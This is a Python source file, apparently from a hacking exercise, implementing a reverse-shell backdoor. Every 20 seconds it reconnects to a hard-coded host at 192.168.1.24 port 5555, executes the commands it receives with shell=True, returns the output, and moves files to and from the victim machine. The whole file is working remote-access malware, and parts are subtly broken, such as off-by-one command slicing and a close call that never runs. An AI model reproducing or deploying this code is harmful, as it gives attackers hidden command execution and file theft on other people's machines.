import socket
import time
import subprocess
import json
import os


# Create the socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# Download file function will download files from target machine
def download_file(file_name):
    # Open a file handle that will write bytes to the local system
    fh = open(file_name, 'wb')
    # Set to make sure the program does not get stuck
    sock.settimeout(1)
    # Receiving packets of data
    chunk = sock.recv(1024)
    # Run this while loop as long as there is something in chunk
    while chunk:
        fh.write(chunk)
        try:
            chunk = sock.recv(1024)
        except socket.timeout as e:
            break
    # Remove the timeout when done
    sock.settimeout(None)
    # Close the file
    fh.close


# Upload file will upload the specified file to the pipe
def upload_file(file_name):
    # Read the file by bytes from the system
    fh = open(file_name, 'rb')
    sock.send(fh.read())


# Reliable receive function will get data back from the target
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


# Reliable send function will send the input command to the target system
def reliable_send(command):
    # Create the json data object from the command
    json_data = json.dumps(command)
    # Encode the data and then send it to the server
    sock.send(json_data.encode())


# Shell function will interact with the target shell
def shell():
    # Option menu (makeshift meterpreter shell)
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command == 'clear':
            pass
        elif command[:9] == 'download ':
            upload_file(command[10:])
        elif command[:7] == 'upload ':
            download_file(command[8:])
        else:
            # Execute the command using a process and pipe
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # Read the data form stdout and/or stderr
            result = execute.stdout.read() + execute.stderr.read()
            # Decode the information
            result = result.decode()
            # Send the result
            reliable_send(result)


# Connection function connects to the correct port
def connection(sock):
    # Sleep for 20 seconds and then try to connect every 20 seconds
    while True:
        time.sleep(20)
        try:
            sock.connect(('192.168.1.24', 5555))
            shell()
            sock.close()
            break
        except:
            connection(sock)


# Main backdoor program
def main():
    # Connect to the server
    connection(sock)


if __name__ == '__main__':
    main()
